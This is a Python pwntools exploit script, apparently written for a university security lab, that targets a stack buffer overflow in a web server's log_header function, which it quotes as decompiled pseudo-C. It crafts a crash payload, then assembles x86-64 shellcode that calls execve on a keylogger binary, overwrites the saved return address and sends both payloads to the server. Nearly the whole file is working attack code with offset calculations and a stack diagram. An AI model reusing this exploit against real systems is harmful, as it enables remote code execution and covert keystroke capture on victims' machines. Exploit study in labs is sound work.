#!/bin/python3

#Pseudo C from IDA FREE
""" __int64 __fastcall log_header(const char *a1, int a2, int *a3)
{
  FILE *v6; // rax
  FILE *v7; // r14
  char s[512]; // [rsp+0h] [rbp-250h] BYREF //Buffer start at RBP-250h
  struct sockaddr addr; // [rsp+200h] [rbp-50h] BYREF
  char buf[24]; // [rsp+210h] [rbp-40h] BYREF
  int v12; // [rsp+228h] [rbp-28h]
  socklen_t len[9]; // [rsp+22Ch] [rbp-24h] BYREF

  v12 = 0;
  len[0] = 16;
  if ( getsockname(fd: *a3, &addr, len) != 0 )
    return 0xFFFFFFFFLL;
  if ( inet_ntop(af: 2, cp: &addr.sa_data[2], buf, len: 0x10u) == nullptr )
    return 0xFFFFFFFFLL;
  memset(s, c: 0, n: sizeof(s)); //initializes all 512 bytes of s to zero
  sprintf(s, format: "== Request from %-15s at fd %-10d\n%s", buf, *a3, a1); //%s at the end inserts the contents of a1
  puts(s);
  v12 = a2;
  v6 = fopen(filename: "../server.log", modes: "a");
  if ( v6 == nullptr )
    return 0xFFFFFFFFLL;
  v7 = v6;
  fprintf(stream: v6, format: "%s\n\n", s);
  fclose(stream: v7);
  return (unsigned int)*a3;
} """

from keystone import *
from pwn import *

### CONFIGS ###
server_addr = "localhost"
port = 8080 
#original_rbp = 0x7ffff7608a00 # The rbp value for a normal execution of log_header when N = 1 (get this with GDB)
original_rbp = 0x7ffff760aa00 # The rbp value for a normal execution of log_header when N = 1 (get this with GDB)
input_buffer_rbp_offset = 0x250 # The input buffer starts at original_rbp-0x250 (see disassembly)
# On a conventional x86-64 stack frame, the saved return address is another 8 bytes above the saved RBP
input_buffer_prefix_len = 49 # The server already adds 49 bytes at the start of the input buffer ("== Request from"...)
message_prefix = b"GET /data.txt HTTP/1.1\r\n" # Start of the valid HTTP request
message_prefix_len = len(message_prefix) #24 bytes


# Wait to copy the keylogger binary to the remote machine (allowed in scenario 1)
# For example, with scp (see assignment)
input("Copy the 'keylogger' binary to 'server_data'. Input anything to continue...")


### CREATE THE CRASH PAYLOAD ###
crash_payload = message_prefix
padding_size = input_buffer_rbp_offset + 8 - input_buffer_prefix_len - len(crash_payload) # Extra 8 bytes to account for the caller's rbp
crash_payload += b"q" * padding_size # Add padding to reach the location of the return address
crash_payload += 0xffffffffffffffff.to_bytes(8, "little") # Add the new return address (little endian)
crash_payload += b"\r\n\r\n"


### CREATE THE ATTACK PAYLOAD ###
keylogger = b"./keylogger"
placeholder = b"12345678" #8 bytes after executable path for later zero-valued entry
keylogger_len = len(keylogger)
placeholder_len = len(placeholder)
# The offset of our injected payload wrt the 'rsp' after entering the shell code
payload_to_rsp_offset = 0x10 + input_buffer_rbp_offset - input_buffer_prefix_len - message_prefix_len
shell_code=f"""
  # Setup execve args
  # Note: when launching a program from a shell, the first command line argument in argv is the command invocation that launched the program.
  # If you do not follow this convention (like in this example), make sure your keylogger starts processing the program arguments starting at index 0 instead of 1!
  lea rdi, [rsp-{payload_to_rsp_offset}] # Ptr to injected "./keylogger" string
  lea rsi, [rsp-{payload_to_rsp_offset - keylogger_len}] # Argv: ptr to placeholder (future NULL ptr to denote an empty array)
  lea rdx, [rsp-{payload_to_rsp_offset - keylogger_len}] # Envp: we can use the same array as for argv as they are both empty
  # Put a NULL ptr in the placeholder at run time
  xor rax, rax
  mov [rdx], rax
  # Perform the execve syscall Its C equivalent is: execve(filename, argv, envp);
  mov al, 59
  syscall
"""
#RDI	Filename	Pointer to ./keylogger
#RSI	argv	Pointer to an argument array
#RDX	envp	Pointer to an environment array
#xor rax, rax sets RAX to zero.
#On Linux x86-64, syscall number 59 corresponds to execve

# Assemble the shell code
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, _ = ks.asm(shell_code)

# Build the payload
sc1_exploit = message_prefix
sc1_exploit += keylogger + placeholder # Add the argument values
sc1_exploit += bytes(encoding) # Add assembled shell code
padding_size = input_buffer_rbp_offset + 8 - input_buffer_prefix_len - len(sc1_exploit)
sc1_exploit += b"q" * padding_size
new_retaddr = original_rbp - input_buffer_rbp_offset + input_buffer_prefix_len + message_prefix_len + keylogger_len + placeholder_len # The new (absolute) return address points to the first byte of the shell code
sc1_exploit += new_retaddr.to_bytes((new_retaddr.bit_length() + 7) // 8, byteorder = "little") # Add the new little endian return address without trailing null bytes
sc1_exploit += b"\r\n\r\n"

# Check for \0 bytes bcs we cannot inject those in this scenario
#If the transmitted payload contains one, the server may stop copying at that point.
if 0 in sc1_exploit:
  print("The payload contains null bytes. Rewrite it to eliminate them!")
  sys.exit(0)


### PERFORM THE ATTACK ###
r = remote(server_addr, port)
r.send(crash_payload) # Send crash payload
#The crash is intended to reset the server's state so the next connection gets a predictable stack address.
# You can read the response using `r.recv()` or `r.recvall()`
print(r.recvall())
sleep(2) # Let the server restart
remote(server_addr, port).send(sc1_exploit) # Send attack payload


# Details for 'payload_to_rsp_offset':
#
# Stack representation BEFORE shell code injecting:
#
#                                                      ┌> original_rbp             ┌> start of vulnerable input buffer
#                                                      |                           |
#                                          |<---0x10-->|<---------0x250----------->|
# Stack: <HIGH ADDRESSES> =|======<1>======|retaddr|<2>|===========<3>=============| <LOW ADDRESSES>  (stack grow direction -->)
#                                          |           |=<5>=|=========<4>=========|
#                                          |                 |==<6>==|==<7>=|==<8>=|
#                                          |                         |<-24->|<-49->|
#                                          |                         └> start of injected payload
#                                          |                         |
# The stack RIGHT AFTER return to the injected shell code:           |
#                                          |                         |
#                                     rsp <┐   ┌------points to------┐
#                                          |   |                     v
# Stack: <HIGH ADDRESSES> =|======<1>======|retaddr|padding|shellcode|... <LOW ADDRESSES>  (stack grow direction -->)
#                                          |<-payload_to_rsp_offset->|
#
# Legend:
#   <--XX-->: size notation
#   ==<X>==: stack data
#     <1>: caller stack frame
#     <2>: the caller's spilled rbp
#     <3>: log_header stack frame
#     <4>: vulnerable buffer
#     <5>: callee-saved register and other local variables
#     <6>: rest of request header
#     <7>: message_prefix ("GET /data.txt HTTP/1.1\r\n")
#     <8>: input_buffer_prefix ("== Request from"...)
